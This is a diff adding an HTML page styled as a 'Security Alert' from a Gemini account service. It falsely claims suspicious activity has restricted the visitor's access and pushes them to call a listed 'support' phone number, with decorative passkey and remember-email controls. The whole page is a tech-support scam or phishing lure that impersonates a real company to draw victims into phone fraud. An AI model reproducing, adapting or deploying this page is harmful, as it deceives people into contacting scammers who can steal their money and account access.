@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Security Alert</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #ffffff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 40px 20px;
+    }
+
+    .top-right {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      font-size: 14px;
+    }
+
+    .top-right a {
+      text-decoration: none;
+      font-weight: bold;
+      color: #000;
+      background-color: #f0f0f0;
+      padding: 10px 14px;
+      border-radius: 20px;
+    }
+
+    .logo {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+    }
+
+    .logo img {
+      width: 36px;
+    }
+
+    .alert-container {
+      max-width: 600px;
+      text-align: center;
+      margin-top: 100px;
+    }
+
+    .alert-title {
+      font-size: 24px;
+      font-weight: bold;
+      color: #e53935;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      margin-bottom: 16px;
+    }
+
+    .alert-title img {
+      width: 24px;
+      height: 24px;
+    }
+
+    .alert-message {
+      font-size: 18px;
+      color: #333;
+      line-height: 1.6;
+      margin-bottom: 30px;
+    }
+
+    .call-button {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      background-color: #ff4747;
+      color: black;
+      font-size: 18px;
+      font-weight: bold;
+      padding: 16px;
+      border: none;
+      border-radius: 8px;
+      text-decoration: none;
+      gap: 10px;
+      min-width: 350px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+
+    .call-button i {
+      font-size: 20px;
+    }
+
+    .passkey-button {
+      background-color: #eee;
+      color: #000;
+      font-size: 16px;
+      padding: 14px 20px;
+      border-radius: 30px;
+      border: none;
+      margin-top: 40px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      min-width: 350px;
+      font-weight: bold;
+    }
+
+    .remember {
+      margin-top: 20px;
+      font-size: 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    @media (max-width: 500px) {
+      .alert-message {
+        font-size: 16px;
+      }
+
+      .call-button, .passkey-button {
+        min-width: 100%;
+        font-size: 16px;
+        padding: 14px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="logo">
+    <img src="logo.jpg" alt="Logo" />
+  </div>
+
+  <div class="top-right">
+    Don’t have a Gemini account?
+    <a href="#">Create a new account</a>
+  </div>
+
+  <div class="alert-container">
+    <div class="alert-title">
+      <img src="icons8-warning-30.png" alt="Warning Icon">
+      <span>Security Alert</span>
+    </div>
+
+    <div class="alert-message">
+      Suspicious activity detected on your device. For your protection and security we've temporarily restricted access.
+      <br><br>
+      Please get in touch with the support team for more information.
+    </div>
+
+    <a href="tel:+18339219241" class="call-button">
+      <i>📞</i> Call: <span style="font-weight: bold;">+1(833)921-9241</span>
+    </a>
+
+    <button class="passkey-button">
+      🔑 Sign in with passkey
+    </button>
+
+    <div class="remember">
+      <input type="checkbox" id="remember" />
+      <label for="remember">Remember my email address</label>
+    </div>
+  </div>
+
+</body>
+</html>
